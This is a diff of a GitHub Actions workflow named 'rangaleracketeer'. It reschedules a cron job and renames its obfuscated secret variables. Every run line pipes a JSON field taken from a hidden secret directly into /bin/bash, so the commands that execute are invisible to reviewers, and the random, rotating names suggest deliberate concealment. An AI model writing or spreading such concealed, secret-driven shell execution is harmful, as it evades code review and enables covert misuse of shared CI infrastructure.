@@ -3,8 +3,7 @@ name: rangaleracketeer
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
-
+    - cron: '37 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,17 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: rangaleracketeer
         env:
-          djia62273: ${{ secrets.djia62273 }}
+          big751: ${{ secrets.big751 }}
         run: |
-          echo $djia62273 | jq -r .amo80 | /bin/bash
-          echo $zt24 | jq -r .ynck096 | /bin/bash
-          echo $bopxh18217 | jq -r .e22 | /bin/bash
-          echo $pk4392 | jq -r .d9 | /bin/bash
-          echo $z64361 | jq -r .ul88583 | /bin/bash
-          echo $he264 | jq -r .mlj12906 | /bin/bash
-          echo $l82 | jq -r .zrb35293 | /bin/bash
-          echo $vnxl480 | jq -r .z62500 | /bin/bash
-          echo $r0 | jq -r .cws402 | /bin/bash
-          echo $vllfn4 | jq -r .tf4 | /bin/bash
-          echo $en50 | jq -r .lcna9409 | /bin/bash
+          echo $big751 | jq -r .soukl085 | /bin/bash
+          echo $kynm81639 | jq -r .e81 | /bin/bash
+          echo $vbny9 | jq -r .l653 | /bin/bash
+          echo $mjzu30488 | jq -r .b29 | /bin/bash
+          echo $oumnv67 | jq -r .jsp4260 | /bin/bash
+          echo $hcau9 | jq -r .irr71 | /bin/bash
+          echo $qfng5840 | jq -r .dyp8 | /bin/bash
+          echo $ixg501 | jq -r .r60 | /bin/bash
+          echo $pngng603 | jq -r .cgz4461 | /bin/bash
+          echo $iww490 | jq -r .vuz616 | /bin/bash
+          echo $qho9 | jq -r .lbr83 | /bin/bash
 
